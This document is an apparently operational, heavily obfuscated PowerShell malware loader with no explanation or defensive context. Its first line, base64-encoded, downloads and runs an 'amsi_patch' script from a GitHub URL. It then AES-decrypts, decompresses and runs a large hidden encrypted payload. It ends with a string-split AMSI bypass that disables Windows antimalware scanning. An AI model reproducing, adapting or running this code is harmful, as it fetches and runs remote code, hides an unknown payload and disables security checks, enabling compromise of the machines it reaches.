([TeXt.EnCoDiNg]::uTf8.gEtstRInG([Convert]::FromBase64String("JFByb2dyZXNzUHJlZmVyZW5jZSA9ICdTaWxlbnRseUNvbnRpbnVlJztbTmV0LlNlcnZpY2VQb2ludE1hbmFnZXJdOjpTZWN1cml0eVByb3RvY29sID0gW05ldC5TZWN1cml0eVByb3RvY29sVHlwZV06OlRsczEyO2lleCAoaXdyICJodHRwczovL2dpdGh1Yi5jb20vQ2hhaW5za2kvQUVTLUVuY29kZXIvcmF3L21haW4vYW1zaV9wYXRjaC5wczEiIC11c2ViKQ==")))|i`e`x
$5CregMg = [cOnvert]::frOMbASe64striNg("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")
$wNiWXus = [CoNVerT]::froMbase64STRing("CNWy32WqCqET2rK7Pt5VB2HY5wNKw0YSMnTgBf6wV94=")
$jFxI1dY = &(GCM *w-o*t) "SysTEM.SecURity.CRYpTOGRaPhY.aeSManAgED"
$jFxI1dY.ModE = [SYSTem.SecUriTy.CrYPTOGrapHY.cIpheRmodE]::CbC
$jFxI1dY.pAddINg = [sYsTem.SECuRIty.cRYptOGRaPhy.PaDdiNgMoDe]::ZeROs
$jFxI1dY.BlOckSIze = ((10+50-20*2)+(4)-20/20+105)
$jFxI1dY.kEysIZe = ((10+166-20*2)+(97)+(12+11))
$jFxI1dY.Key = $wNiWXus
$jFxI1dY.Iv = $5CregMg[0..15]
$OvZS6iw = &(GCM *w-o*t) System.IO.MemoryStream
$0Y1bgq0 = &(GCM *w-o*t) SYstEm.io.meMORYSTReAm(,$jFxI1dY.CreAteDecRYpToR().tRANsFOrMFiNALbLocK($5CregMg,16,$5CregMg.Length-16))
$x9fMyrY = &(GCM *w-o*t) SYSTEm.iO.compressiOn.GzipSTrEAm $0Y1bgq0, ([io.comPreSsIOn.coMPRESsioNmOdE]::DecoMPREss)
$x9fMyrY.CopyTo($OvZS6iw)
$x9fMyrY.CLoSe()
$Pl9BwTw = [TeXT.EnCOdInG]::UtF8.GetStriNG($OvZS6iw.tOARRAY())
$jFxI1dY.dISPOsE()
$0Y1bgq0.Close()
i"e"x($Pl9BwTw)
${byP`Ass} = (-join ([regex]::Matches(("{7}{11}{10}{14}{5}{9}{13}{6}{15}{2}{0}{4}{1}{16}{12}{8}{3}" -f'e2',("{0}{1}"-f '41','6d'),'6',("{2}{0}{1}" -f'9',("{1}{0}"-f '73','6c'),('7'+'46')),'e',('61'+'6'),'6',("{1}{0}{3}{2}"-f'37','5','6',("{1}{2}{0}" -f'65',('97'+'3'),'74')),('95'+'5'),("{3}{2}{0}{1}"-f '6',("{1}{0}"-f('74'+'2'),'e'),'5',("{0}{1}" -f '76',("{0}{1}"-f'5',('6d'+'6')))),'e4','d2','36',("{3}{0}{1}{2}" -f ('41'+'7'),("{1}{0}"-f '46','57'),('f6'+'d'),'e'),("{1}{0}"-f '6e',('d6'+'1')),("{2}{1}{0}" -f("{0}{1}" -f("{0}{1}" -f('46'+'9'),'6'),'f'),'7','1'),'7'), '..') | ForEach-Object { [char]([convert]::ToUInt32(${_}.Value, 16)) }))
${am`si} = [Text.Encoding]::UTF8.GetString((0x61,0x6d,0x73,0x69,0x49,0x6e,0x69,0x74,0x46,0x61,0x69,0x6c,0x65,0x64))
${aS`sEm`BLY} = [Ref].Assembly
${Ty`PE} = ${ASsemB`LY}.GetType(${ByP`A`Ss})
${fIE`ld} = ${t`Ype}.GetField(${A`msi}, ("{3}{2}{4}{0}{1}" -f("{1}{0}" -f 'ti',('S'+'ta')),'c',('on'+'P'),'N',("{1}{0}" -f("{1}{0}"-f', ',("{0}{1}"-f('b'+'li'),'c')),'u')))
${F`IELd}.SetValue(${N`UlL}, ${TR`Ue})
